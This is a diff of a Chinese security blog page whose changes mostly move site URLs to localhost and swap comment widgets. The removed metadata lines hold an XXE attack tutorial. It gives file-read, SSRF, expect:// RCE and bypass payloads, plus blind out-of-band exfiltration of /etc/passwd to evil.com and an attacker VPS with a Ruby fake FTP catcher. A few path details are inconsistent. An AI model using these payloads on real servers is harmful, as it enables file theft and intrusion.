@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="dark">
 
-<head><meta charset="utf-8">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
+<meta name="robots" content="noindex, nofollow">
 <title>XML 漏洞详解 | h4xk0r blog</title>
 <meta name="keywords" content="">
 <meta name="description" content="XML漏洞
@@ -57,16 +57,16 @@ Content-Type: application/xml  &lt;-- 修改这里
 svg： 是一种图片格式的矢量图。微信头像，网站logo上传处
 Execl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传，报表导入处">
 <meta name="author" content="h4xk0r">
-<link rel="canonical" href="https://b1ckdoor.com/posts/xml/">
+<link rel="canonical" href="http://localhost:1313/posts/xml/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.a72a21d173e6574a7d787ef864b8ff56506981bd547deea0fbd1766f099539cc.css" integrity="sha256-pyoh0XPmV0p9eH74ZLj/VlBpgb1Ufe6g&#43;9F2bwmVOcw=" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://b1ckdoor.com/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://b1ckdoor.com/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://b1ckdoor.com/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://b1ckdoor.com/apple-touch-icon.png">
-<link rel="mask-icon" href="https://b1ckdoor.com/safari-pinned-tab.svg">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://b1ckdoor.com/posts/xml/">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/xml/">
 <noscript>
     <style>
         #theme-toggle,
@@ -81,137 +81,13 @@ Execl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传�
         document.querySelector("html").dataset.theme = 'light';
     }
 
-</script><meta property="og:url" content="https://b1ckdoor.com/posts/xml/">
-  <meta property="og:site_name" content="h4xk0r blog">
-  <meta property="og:title" content="XML 漏洞详解">
-  <meta property="og:description" content="XML漏洞 理论： xml是一种用来传输和存储数据的格式，长得有些像HTML
-&lt;user&gt; &lt;username&gt;admin&lt;/username&gt; &lt;role&gt;manager&lt;/role&gt; &lt;/user&gt; 要学习XML就要先学习DTD
-什么是DTD？
-DTD（文档类型定义）使用来定义xml文档的合法结构。重点在于DTD允许定义实体也就是Entity，而他也就是漏洞的根源
-他有些像编程语言中的变量，举两个例子
-内部实体 &lt;!DOCTYPE root [ &lt;!ENTITY name &#34;h4xk0r&#34;&gt; ]&gt; &lt;root&gt;Hello &amp;name;&lt;/root&gt; 外部实体----这是漏洞的核心，xml允许从外部通过url或文件路径加载数据 语法关键字 SYSTEM 或 PUBLIC &lt;!DOCTYPE root[ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt; ]&gt; &lt;root&gt;&amp;xxe;&lt;root&gt; 如果在实际过程中后端接收了你的XML，并且解析了&amp;xxe这个变量，那么就可以通过构造SYSTEM后面的路径，让服务器读取文件，探测内网 实战向： 怎么去寻找漏洞点： 显式的XML接口：
-如果请求头是 Content-Type: application/xml 或 text/xml，且数据包体是 XML，那么可以直接插入payload进行测试，但是感觉现在很少了
-隐式接口（content-Type欺骗）：
-假设一个api接口是这样的： POST /api/login HTTP/1.1 Content-Type: application/json {&#34;user&#34;: &#34;admin&#34;, &#34;pass&#34;: &#34;123&#34;} 很多框架为了兼容性，会根据Content-Type切换解析器，所以我们构造payload POST /api/login HTTP/1.1 Content-Type: application/xml &lt;-- 修改这里 &lt;?xml version=&#34;1.0&#34; ?&gt; &lt;user&gt;admin&lt;/user&gt; &lt;pass&gt;123&lt;/pass&gt; 如果这时候服务器没有报错说明支持xml格式，那么就可以构造payload测试xxe漏洞了 文件上传（SVG与office）–这个是比较容易被忽视的点
-svg： 是一种图片格式的矢量图。微信头像，网站logo上传处
-Execl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传，报表导入处">
-  <meta property="og:locale" content="zh-cn">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2026-02-04T00:00:00+00:00">
-    <meta property="article:modified_time" content="2026-02-04T00:00:00+00:00">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XML 漏洞详解">
-<meta name="twitter:description" content="XML漏洞
-理论：
-xml是一种用来传输和存储数据的格式，长得有些像HTML
-&lt;user&gt;
-	&lt;username&gt;admin&lt;/username&gt;
-	&lt;role&gt;manager&lt;/role&gt;
-&lt;/user&gt;
-要学习XML就要先学习DTD
-什么是DTD？
-DTD（文档类型定义）使用来定义xml文档的合法结构。重点在于DTD允许定义实体也就是Entity，而他也就是漏洞的根源
-他有些像编程语言中的变量，举两个例子
-内部实体   
-&lt;!DOCTYPE root [
-	&lt;!ENTITY name &#34;h4xk0r&#34;&gt;
-]&gt;
-&lt;root&gt;Hello &amp;name;&lt;/root&gt;
-外部实体----这是漏洞的核心，xml允许从外部通过url或文件路径加载数据
-语法关键字 SYSTEM 或 PUBLIC
-
-&lt;!DOCTYPE root[
-	&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;
-]&gt;
-&lt;root&gt;&amp;xxe;&lt;root&gt;
-
-如果在实际过程中后端接收了你的XML，并且解析了&amp;xxe这个变量，那么就可以通过构造SYSTEM后面的路径，让服务器读取文件，探测内网
-实战向：
-怎么去寻找漏洞点：
-显式的XML接口：
-如果请求头是 Content-Type: application/xml 或 text/xml，且数据包体是 XML，那么可以直接插入payload进行测试，但是感觉现在很少了
-隐式接口（content-Type欺骗）：
-假设一个api接口是这样的：
-POST /api/login HTTP/1.1
-Content-Type: application/json
-
-{&#34;user&#34;: &#34;admin&#34;, &#34;pass&#34;: &#34;123&#34;}
-
-很多框架为了兼容性，会根据Content-Type切换解析器，所以我们构造payload
-
-POST /api/login HTTP/1.1
-Content-Type: application/xml  &lt;-- 修改这里
-
-&lt;?xml version=&#34;1.0&#34; ?&gt;
-&lt;user&gt;admin&lt;/user&gt;
-&lt;pass&gt;123&lt;/pass&gt;
-
-如果这时候服务器没有报错说明支持xml格式，那么就可以构造payload测试xxe漏洞了
-文件上传（SVG与office）&ndash;这个是比较容易被忽视的点
-svg： 是一种图片格式的矢量图。微信头像，网站logo上传处
-Execl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传，报表导入处">
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Posts",
-      "item": "https://b1ckdoor.com/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "XML 漏洞详解",
-      "item": "https://b1ckdoor.com/posts/xml/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "XML 漏洞详解",
-  "name": "XML 漏洞详解",
-  "description": "XML漏洞 理论： xml是一种用来传输和存储数据的格式，长得有些像HTML\n\u0026lt;user\u0026gt; \u0026lt;username\u0026gt;admin\u0026lt;/username\u0026gt; \u0026lt;role\u0026gt;manager\u0026lt;/role\u0026gt; \u0026lt;/user\u0026gt; 要学习XML就要先学习DTD\n什么是DTD？\nDTD（文档类型定义）使用来定义xml文档的合法结构。重点在于DTD允许定义实体也就是Entity，而他也就是漏洞的根源\n他有些像编程语言中的变量，举两个例子\n内部实体 \u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY name \u0026#34;h4xk0r\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt;Hello \u0026amp;name;\u0026lt;/root\u0026gt; 外部实体----这是漏洞的核心，xml允许从外部通过url或文件路径加载数据 语法关键字 SYSTEM 或 PUBLIC \u0026lt;!DOCTYPE root[ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt;\u0026amp;xxe;\u0026lt;root\u0026gt; 如果在实际过程中后端接收了你的XML，并且解析了\u0026amp;xxe这个变量，那么就可以通过构造SYSTEM后面的路径，让服务器读取文件，探测内网 实战向： 怎么去寻找漏洞点： 显式的XML接口：\n如果请求头是 Content-Type: application/xml 或 text/xml，且数据包体是 XML，那么可以直接插入payload进行测试，但是感觉现在很少了\n隐式接口（content-Type欺骗）：\n假设一个api接口是这样的： POST /api/login HTTP/1.1 Content-Type: application/json {\u0026#34;user\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;123\u0026#34;} 很多框架为了兼容性，会根据Content-Type切换解析器，所以我们构造payload POST /api/login HTTP/1.1 Content-Type: application/xml \u0026lt;-- 修改这里 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt; \u0026lt;user\u0026gt;admin\u0026lt;/user\u0026gt; \u0026lt;pass\u0026gt;123\u0026lt;/pass\u0026gt; 如果这时候服务器没有报错说明支持xml格式，那么就可以构造payload测试xxe漏洞了 文件上传（SVG与office）\u0026ndash;这个是比较容易被忽视的点\nsvg： 是一种图片格式的矢量图。微信头像，网站logo上传处\nExecl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传，报表导入处\n",
-  "keywords": [
-    
-  ],
-  "articleBody": "XML漏洞 理论： xml是一种用来传输和存储数据的格式，长得有些像HTML\nadmin manager 要学习XML就要先学习DTD\n什么是DTD？\nDTD（文档类型定义）使用来定义xml文档的合法结构。重点在于DTD允许定义实体也就是Entity，而他也就是漏洞的根源\n他有些像编程语言中的变量，举两个例子\n内部实体 \u003c!DOCTYPE root [ \u003c!ENTITY name \"h4xk0r\"\u003e ]\u003e Hello \u0026name; 外部实体----这是漏洞的核心，xml允许从外部通过url或文件路径加载数据 语法关键字 SYSTEM 或 PUBLIC \u003c!DOCTYPE root[ \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u0026xxe; 如果在实际过程中后端接收了你的XML，并且解析了\u0026xxe这个变量，那么就可以通过构造SYSTEM后面的路径，让服务器读取文件，探测内网 实战向： 怎么去寻找漏洞点： 显式的XML接口：\n如果请求头是 Content-Type: application/xml 或 text/xml，且数据包体是 XML，那么可以直接插入payload进行测试，但是感觉现在很少了\n隐式接口（content-Type欺骗）：\n假设一个api接口是这样的： POST /api/login HTTP/1.1 Content-Type: application/json {\"user\": \"admin\", \"pass\": \"123\"} 很多框架为了兼容性，会根据Content-Type切换解析器，所以我们构造payload POST /api/login HTTP/1.1 Content-Type: application/xml \u003c-- 修改这里 \u003c?xml version=\"1.0\" ?\u003e admin 123 如果这时候服务器没有报错说明支持xml格式，那么就可以构造payload测试xxe漏洞了 文件上传（SVG与office）–这个是比较容易被忽视的点\nsvg： 是一种图片格式的矢量图。微信头像，网站logo上传处\nExecl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传，报表导入处\n实战payload 情况一：\n有回显的文件读取，页面会直接打印出来输入的命令\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u0026xxe; windows用file:///c:/windows/win.ini 情况二：\nSSRF内网探测端口或者web\n\u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"http://192.168.1.1:80/admin\"\u003e ]\u003e \u0026xxe; 情况三：\n盲注（OOB/Blind XXE）– 常见\n页面不返回任何内容则需要使用带外攻击（OOB），这里需要参数实体，语法用%而不是\u0026\n步骤如下：\nvps上http://example.com下创建文件evil.dtd内容如下\n\u003c!ENTITY % file SYSTEM \"file:///etc/passwd\"\u003e \u003c!ENTITY % eval \"\u003c!ENTITY \u0026#x25; exfiltrate SYSTEM 'http://evil.com/?data=%file;'\u003e\"\u003e %eval; (注意：% 是 % 的 HTML 转义，为了防止嵌套解析错误)\n发送payload (访问自己开的网站)\n\u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE foo [ \u003c!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\"\u003e %xxe; %exfiltrate; ]\u003e 原理解析：\n目标去指定的位置解析去找了我们vps上的文件，加载DTD文件，读取文件存入%file，目标发送请求，我们就可以在web日志中看到敏感文件\n扩展：svg图片上传payload\n创建svg文件，内容如下：\n\u003c?xml version=\"1.0\" standalone=\"yes\"?\u003e \u003c!DOCTYPE test [ \u003c!ENTITY xxe SYSTEM \"file:///etc/hostname\" \u003e ]\u003e \u0026xxe; 查看图片上是否有水印\n特殊技巧及绕过 技巧： 如果遇到php环境，有可能安装expect扩展，比较少见，但是成功可以直接RCE! \u003c!ENTITY xxe SYSTEM \"expect://id\"\u003e Excel/Word\n解压软件手动改容易破坏文件结构，建议使用Oxml_xxe这种专门的工具，编辑完xml后重新打包整个目录\n绕过： 技巧一： php的base64编码读取 ，为了应对读取的文件中包含特殊字符 \u003c!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\"\u003e 技巧二： CDATA绕过 如果不能用 Base64（比如 Java 环境），读取包含 XML 特殊字符的文件会报错。可以使用 CDATA 包裹数据。 需要配合外部 DTD 配合，通常用于 Blind XXE 中读取复杂的配置文件（如 web.xml）。\n具体实现方法如下：\nvps上的web目录创建evil.dtd文件 \u003c!ENTITY % start \"\u003c![CDATA[\"\u003e \u003c!ENTITY % file SYSTEM \"file:///etc/etc/passwd\"\u003e \u003c!ENTITY % end \"]]\u003e\"\u003e \u003c!ENTITY % all \"\u003c!ENTITY \u0026#x26; res '%start;%file;%end;'\u003e\"\u003e 在目标网站发送请求 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY % remote SYSTEM \"http://evil.com/evil.dtd\"\u003e %remote; %all; ]\u003e \u0026res; 原理解析：\n目标服务器读取并且解析xml，读取了dtd文件，在内存中：\n%start; 变成了 \u003c![CDATA[ %file; 变成了 /etc/fstab 的真实内容 %end; 变成了 ]]\u003e 执行 %all; 时，它在内部定义了一个普通的文本实体 \u0026res;，其值为： \u003c![CDATA[ ...文件内容... ]]\u003e\n最后在 \u0026res; 中，由于内容被 CDATA 包裹，XML 解析器会直接把它当作一段文本输出，而不会因为文件里有 \u003c 符号而报错。\n那这个时候又有一个问题，如果没有回显怎么办？\n方法一：\n报错注入，利用不完整的dtd文件诱发解析器错误，将读取到的内容显示在报错信息中，修改dtd内容如下：\n\u003c!ENTITY % file SYSTEM \"file:///etc/passwd\"\u003e \u003c!ENTITY % eval \"\u003c!ENTITY \u0026#x25; error SYSTEM 'file:///nonexistent/%file;'\u003e\"\u003e %eval; %error; 服务器会因为找不到 /nonexistent/root:x:0... 这个文件而报错，而报错信息中就包含我们想要的信息\n方法二：\n利用FTP协议（java环境特有）\nJava 的 XML 解析器支持通过 FTP 协议外带数据。由于 FTP 允许传输包含换行和特殊字符的原始数据，这种方法比 HTTP 稳定得多。\n使用工具（如 ruby_ftp_server.rb）在 VPS 启动一个模拟 FTP 监听。\nPayload 修改为 SYSTEM \"ftp://evil.com:21/%file;\"。\n手动复现步骤如下：\n准备：需要一个能记录客户端 RETR 命令的“伪 FTP 服务器”\n在vps上启动伪FTP监听，运行脚本.rb\nrequire 'socket' server = TCPServer.new 2121 # 监听2121端口 puts \"Fake FTP server started on port 2121...\" loop do Thread.start(server.accept) do |client| puts \"Client connected.\" client.puts \"220 Fake FTP Server Ready\" loop do gets = client.gets puts \"Received: #{gets}\" # 这里会打印出包含文件内容的请求 if gets.start_with? \"USER\" client.puts \"331 Password required\" elsif gets.start_with? \"PASS\" client.puts \"230 User logged in\" elsif gets.start_with? \"RETR\" client.puts \"550 File not found\" # 拒绝下载，但我们已经拿到了文件名 break else client.puts \"200 OK\" end end client.close end end 在vps上准备外部DTD文件\n\u003c!ENTITY % file SYSTEM \"file:///etc/passwd\"\u003e \u003c!ENTITY % eval \"\u003c!ENTITY \u0026#x25; exfiltrate SYSTEM 'ftp://47.x.x.x:2121/%file;'\u003e\"\u003e %eval; %exfiltrate; 发送payload\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY % remote SYSTEM \"http://47.x.x.x/evil.dtd\"\u003e %remote; ]\u003e test 此时观察终端脚本的返回内容，就会返回想要的数据了\n如果以上方法都不行那还有一种方法：\n**技巧三：**DTD文件重写 原理：XML 允许在 DOCTYPE 中通过 INTERNAL SUBSET（内部子集）来重新定义已经在外部 DTD 中声明过的实体。并且解释器会优先使用我们的定义\n步骤如下：\n寻找DTD文件（常见路径如下） Linux (Ubuntu/Debian)/usr/share/xml/fontconfig/fonts.dtd Linux (RHEL/CentOS)/usr/share/sgml/docbook/xml-dtd-4.3-1.0-25.el7/ent/isogrk2.ent WindowsC:\\Windows\\System32\\wbem\\xml\\cim20.dtd Java 应用服务器很多自带的 Jar 包里也有，如 hibernate-mapping-3.0.dtd 验证：发送以下payload进行尝试\n\u003c!DOCTYPE root SYSTEM \"/usr/share/xml/fontconfig/fonts.dtd\"\u003e test 构造payload\n假设我们确认目标服务器（Linux）存在 /usr/share/xml/fontconfig/fonts.dtd 这个文件。\n这个 fonts.dtd 内部定义了一个名为 constant 的实体。我们进行重写\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"\u003e \u003c!ENTITY % constant ' \u003c!ENTITY \u0026#x25; file SYSTEM \"file:///etc/passwd\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///nonexistent/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; '\u003e %local_dtd; ]\u003e test 注意细节：\n三重转义：注意 \u0026#x25;。这是因为我们在实体内部定义实体，又在嵌套内定义报错实体。每一层解析都需要多一重转义，否则 XML 解析器在第一层就会“炸掉”。\n引号问题：最外层用单引号 '，内部用双引号 \"。\n",
-  "wordCount" : "510",
-  "inLanguage": "en",
-  "datePublished": "2026-02-04T00:00:00Z",
-  "dateModified": "2026-02-04T00:00:00Z",
-  "author":{
-    "@type": "Person",
-    "name": "h4xk0r"
-  },
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://b1ckdoor.com/posts/xml/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "h4xk0r blog",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://b1ckdoor.com/favicon.ico"
-    }
-  }
-}
 </script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://b1ckdoor.com/" accesskey="h" title="h4xk0r blog (Alt + H)">h4xk0r blog</a>
+            <a href="http://localhost:1313/" accesskey="h" title="h4xk0r blog (Alt + H)">h4xk0r blog</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -237,22 +113,22 @@ Execl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传�
         </div>
         <ul id="menu">
             <li>
-                <a href="https://b1ckdoor.com/posts/" title="档案">
+                <a href="http://localhost:1313/posts/" title="档案">
                     <span>档案</span>
                 </a>
             </li>
             <li>
-                <a href="https://b1ckdoor.com/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                <a href="http://localhost:1313/search/" title="搜索 (Alt &#43; /)" accesskey=/>
                     <span>搜索</span>
                 </a>
             </li>
             <li>
-                <a href="https://b1ckdoor.com/categories/" title="分类">
+                <a href="http://localhost:1313/categories/" title="分类">
                     <span>分类</span>
                 </a>
             </li>
             <li>
-                <a href="https://b1ckdoor.com/fuzzlist/" title="Fuzzlist">
+                <a href="http://localhost:1313/fuzzlist/" title="Fuzzlist">
                     <span>Fuzzlist</span>
                 </a>
             </li>
@@ -584,26 +460,63 @@ end
   <footer class="post-footer">
     <ul class="post-tags">
     </ul>
-  </footer><script src="https://giscus.app/client.js"
-        data-repo="h4xk0r/h4xk0r.github.io"
-        data-repo-id="R_kgDORE9_Hw"
-        data-category="Announcements"
-        data-category-id="DIC_kwDORE9_H84C9ILE"
-        data-mapping="pathname"
-        data-strict="0"
-        data-reactions-enabled="1"
-        data-emit-metadata="0"
-        data-input-position="top"
-        data-theme="preferred_color_scheme"
-        data-lang="zh-CN"
-        crossorigin="anonymous"
-        async>
-</script>
+  </footer><div class="comments">
+    <div id="utterances-container"></div>
+    <script>
+        
+        function getUtterancesTheme() {
+            if (document.body.className.includes("dark") || localStorage.getItem("pref-theme") === "dark") {
+                return "github-dark"; 
+            }
+            return "github-light";    
+        }
+
+        
+        function loadUtterances() {
+            const container = document.getElementById('utterances-container');
+            container.innerHTML = ''; 
+
+            let script = document.createElement("script");
+            script.setAttribute("src", "https://utteranc.es/client.js");
+            script.setAttribute("repo", "h4xk0r/h4xk0r.github.io");
+            script.setAttribute("issue-term", "pathname");
+            script.setAttribute("label", "Comment");
+            script.setAttribute("theme", getUtterancesTheme()); 
+            script.setAttribute("crossorigin", "anonymous");
+            script.setAttribute("async", "true");
+
+            container.appendChild(script);
+        }
+
+        
+        loadUtterances();
+
+        
+        const themeToggle = document.getElementById("theme-toggle");
+        if (themeToggle) {
+            themeToggle.addEventListener("click", () => {
+                setTimeout(() => {
+                    
+                    const newTheme = document.body.className.includes("dark") ? "github-dark" : "github-light";
+                    const message = {
+                        type: 'set-theme',
+                        theme: newTheme
+                    };
+                    
+                    const iframe = document.querySelector('.utterances-frame');
+                    if (iframe) {
+                        iframe.contentWindow.postMessage(message, 'https://utteranc.es');
+                    }
+                }, 100); 
+            });
+        }
+    </script>
+</div>
 </article>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="https://b1ckdoor.com/">h4xk0r blog</a></span> · 
+        <span>&copy; 2026 <a href="http://localhost:1313/">h4xk0r blog</a></span> · 
 
     <span>
         Powered by
